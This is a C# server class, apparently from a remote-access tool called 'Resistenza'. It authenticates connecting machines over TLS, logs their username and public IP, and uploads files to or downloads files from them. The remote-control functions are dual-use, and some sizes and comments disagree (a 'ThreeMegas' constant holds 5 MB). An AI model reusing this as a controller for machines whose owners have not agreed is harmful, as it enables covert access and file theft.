using Resistenza.Common.Networking;
using Resistenza.Common.Packets;
using Resistenza.Server.Config;
using System.Net;
using System.Net.Sockets;
using System.Security.Authentication;

using Resistenza.Common.Tools;
using Microsoft.WSMan.Management;

namespace Resistenza.Server.Networking
{
    public class ConnectedClient
    {

        private TcpClient _TcpClient;
        public SecureStream CustomStream;

        public event EventHandler ConnectionDied;

        public delegate void OnClientRead(object PacketReceived);
        public event OnClientRead IncomingPacket;

        public string UserName { get; private set; }
        private CancellationTokenSource _ReadingLoopTokenSource;

        private string _publicIp;

       
        public ConnectedClient(TcpClient Client)
        {

            _TcpClient = Client;
            _ReadingLoopTokenSource = new CancellationTokenSource();
          
        }
        public string IpAddress
        {
            get
            {
                return _publicIp;
            }
        }

        public async Task<ComputerInfoResponse?> AuthenticateAsync()
        {

            CustomStream = new SecureStream(_TcpClient.GetStream());
            CustomStream.ReadTimeout = 5000;


            bool AuthResult = await CustomStream.AuthenticateAsServerAsync(SocketServer.GetInstance().ServerCert, false, SslProtocols.Tls12 | SslProtocols.Tls13, false);
            if (AuthResult)
            {
                object? ClientInfo = await CustomStream.ReadPacketAsync();

                if (ClientInfo is ComputerInfoResponse)
                {
                    ComputerInfoResponse info = (ComputerInfoResponse)ClientInfo;

                    if (info.ClientUsername == ServerSettings.Username)
                    {
                        UserName = info.ComputerUsername; //si riferisce all'username nel computer del client
                        _publicIp = info.ipAddress;

                        return info;
                    }             
                }        
            }

            return null;

            

        }

        public void Disconnect()
        {
            _ReadingLoopTokenSource.Cancel();
            CustomStream.Disconnect();
        }

        public async Task BeginReadingAsync()
        {
            while (true)
            {
                try
                {
                    dynamic? ReceivedPacket = await CustomStream.ReadPacketAsync(_ReadingLoopTokenSource.Token);
                    if (ReceivedPacket != null)
                    {
                        IncomingPacket?.Invoke(ReceivedPacket);
                    }
                }
                catch (OperationCanceledException) { break; }
                
                
            }


        }



        public async Task<bool> SendFileAsync(string LocalPath, string RemotePath, bool IsLastOfRequest, CancellationToken DeleteOperationToken)
        {
            int ThreeMegasInBytes = 5242880;
           
            try
            {
                FileInfo FileToSend = new FileInfo(LocalPath);
                long FileSize = FileToSend.Length;


                if (FileToSend.Length > ThreeMegasInBytes)
                {


                    int TotalBytesRead = 0;

                    while (TotalBytesRead < FileSize)
                    {
                        DeleteOperationToken.ThrowIfCancellationRequested();
                        byte[] Buffer = new byte[ThreeMegasInBytes];
                        bool IsLastChunk = TotalBytesRead + Buffer.Length >= FileSize;
                        //List<byte> Buffer = new List<byte>();
                        using (BinaryReader Reader = new BinaryReader(new FileStream(LocalPath, FileMode.Open)))
                        {

                            Reader.BaseStream.Seek(TotalBytesRead, SeekOrigin.Begin);
                            Reader.Read(Buffer, 0, Buffer.Length);

                        }
                        FileUploadRequest PartialFile = new();
                        ; //IsLastChunk ? Buffer : new ArraySegment<byte>(Buffer, 0, (int)FileSize - TotalBytesRead).Array;
                        PartialFile.IsPart = true;
                        PartialFile.FilePath = RemotePath;
                        //PartialFile.IsLastOfRequest = ;


                        if (IsLastChunk)
                        {
                            int Offset = (int)(FileSize - TotalBytesRead);
                            byte[] SlicedArray = new ArraySegment<byte>(Buffer, 0, Offset).ToArray();
                            PartialFile.FileBytes = FastCompression.Compress(SlicedArray); //Per evitare che venga inviato l'intero buffer di cui una parte è vuota
                            PartialFile.IsLastOfRequest = (IsLastChunk && IsLastOfRequest);
                            ;
                        }
                        else
                        {
                            
                            PartialFile.FileBytes = FastCompression.Compress(Buffer);
                        }

                        await CustomStream.SendPacketAsync(PartialFile);
                        await Task.Delay(500);

                        TotalBytesRead += Buffer.Length;

                    }
                }

                else //se il file è meno grande di 1 mb allora viene mandato tutto intero, senza essere diviso in chunks
                {
                    FileUploadRequest UploadFileRequest = new();

                    UploadFileRequest.FileBytes = FastCompression.Compress(await File.ReadAllBytesAsync(LocalPath));
                    UploadFileRequest.IsPart = false;
                    UploadFileRequest.FilePath = RemotePath;
                    UploadFileRequest.IsLastOfRequest = IsLastOfRequest;
                    await CustomStream.SendPacketAsync(UploadFileRequest);
                    await Task.Delay(30);

                }

                return true;
            }
            catch(Exception e)
            {       
                if(e is OperationCanceledException)
                {
                    DeleteOperationToken.ThrowIfCancellationRequested();
                    
                    return true;
                }
                return false;
            }

        }

        public async Task<bool> RequestFileDownloadAsync(string RemoteFilePath, bool IsDir)
        {

            //(bool)RemoteFilesGrid.Rows[Row.Index].Cells[4].Value
            //$"{RemoteFilePathTextbox.Text}\\{Row.Cells[1].Value}"
            var DownloadResourceRequest = new FileDownloadRequest();
            DownloadResourceRequest.FileName = RemoteFilePath;
            DownloadResourceRequest.IsDirectory = IsDir;

            if (!await CustomStream.SendPacketAsync(DownloadResourceRequest))
            {
                return false;
            }
            return true;
        }

    }
}

